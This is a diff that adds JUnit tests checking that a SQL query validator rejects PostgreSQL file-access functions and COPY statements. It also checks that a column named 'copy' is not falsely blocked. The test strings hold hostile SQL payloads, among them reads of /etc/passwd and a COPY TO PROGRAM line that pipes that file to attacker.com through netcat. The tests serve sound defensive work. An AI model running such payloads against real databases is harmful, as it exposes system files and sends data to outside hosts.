@@ -425,6 +425,142 @@ class QueryValidatorTest {
 
 
     // =========================================================
+    // FILE ACCESS PROTECTION - POSTGRESQL
+    // =========================================================
+
+    @Test
+    void shouldRejectPgReadFileFunction() {
+
+        String sql =
+                "SELECT pg_read_file('/etc/passwd') FROM customers";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectPgReadFileFunctionRegardlessOfCase() {
+
+        String sql =
+                "select PG_READ_FILE('/etc/passwd') from customers";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectPgReadBinaryFileFunction() {
+
+        String sql =
+                "SELECT pg_read_binary_file('/etc/passwd') FROM customers";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectPgLsDirFunction() {
+
+        String sql =
+                "SELECT pg_ls_dir('/tmp') FROM customers";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectLoExportFunction() {
+
+        String sql =
+                "SELECT lo_export(o.id, '/tmp/dump.bin') FROM orders o";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectLoImportFunction() {
+
+        String sql =
+                "SELECT lo_import('/etc/passwd') FROM customers";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectCopyToFile() {
+
+        String sql =
+                "COPY customers TO '/tmp/dump.csv'";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectCopyFromSubqueryToProgram() {
+
+        String sql =
+                "COPY (SELECT * FROM customers) TO PROGRAM 'nc attacker.com 4444 < /etc/passwd'";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldRejectCopyRegardlessOfCase() {
+
+        String sql =
+                "copy customers to '/tmp/dump.csv'";
+
+        assertThrows(
+                IllegalArgumentException.class,
+                () -> queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    @Test
+    void shouldNotFalsePositiveOnColumnNamedCopy() {
+
+        // "copy" chỉ nguy hiểm khi là LỆNH Ở ĐẦU statement (COPY table TO
+        // ...). Một câu SELECT hợp lệ có cột tên là "copy" (ví dụ số bản
+        // sao/lượt copy) không được phép bị chặn nhầm.
+        String sql =
+                "SELECT copy FROM customers";
+
+        assertDoesNotThrow(() ->
+                queryValidator.validate(sql, schema)
+        );
+    }
+
+
+    // =========================================================
     // OTHER DDL / SESSION STATEMENTS
     // =========================================================
 
